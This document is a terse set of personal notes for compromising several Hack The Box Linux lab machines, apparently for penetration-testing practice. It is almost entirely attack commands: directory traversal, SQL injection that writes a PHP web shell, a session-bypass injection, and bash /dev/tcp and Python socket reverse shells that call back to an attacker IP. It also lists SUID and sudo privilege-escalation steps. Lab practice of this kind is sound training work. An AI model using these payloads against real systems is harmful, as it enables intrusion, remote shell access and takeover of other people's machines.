# Lin-Backdoor
https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
```
http://10.10.11.125/wp-content/plugins/
WordPress Plugin eBook Download 1.1 - Directory Traversal
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
GNU gdbserver 9.2 - Remote Command Execution (RCE)
ps aux
screen -x root/root
```


# Lin-Haircut
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.24/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.24/exposed.php
https://github.com/pentestmonkey/php-reverse-shell.git
http://10.10.14.3/php-reverse-shell.php -o uploads/php-reverse-shell.php
nc -nlvp 1234
http://10.10.10.24/uploads/php-reverse-shell.php
python3 -c "import pty;pty.spawn('/bin/bash’)
find / -perm -4000 2>/dev/null
LinEnum.sh
screen 4.5.0 privesc
```


# Lin-Jarvis
https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
```
SQL injection
http://10.10.10.143/room.php?cod=2 and 1=1
Webshell
http://10.10.10.143/room.php?cod=-2 UNION SELECT 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.3/1234 0>&1"'
sudo -l
Reverse Shell - Bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
sudo -u pepper /var/www/Admin-Utilities/simpler.py –p
find / -perm -4000 2>/dev/null
LinEnum
PrivEsc - SUID systemctl
```


# Lin-Pandora
```
nmap -sU -T5 10.10.11.136
snmpwalk -v 1 -c public 10.10.11.136
ssh daniel@10.10.11.136
ssh -D 9090 daniel@10.10.11.136
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
Upload - php-reverse-shell.php
./LinEnum.sh
cat .ssh/id_rsa.pub
SUID - /usr/bin/pandora_backup
```


# Lin-Bashed
https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
```
http://10.10.10.68/dev/phpbash.php
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
sudo -l
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -u scriptmanager bash -i
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
python -c shell.py
```


# Lin-SolidState
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
```
nc 10.10.10.51 4555
telnet 10.10.10.51 110
Escape rbash
LinEnum.sh
reverse shell - nc
move to bash
```


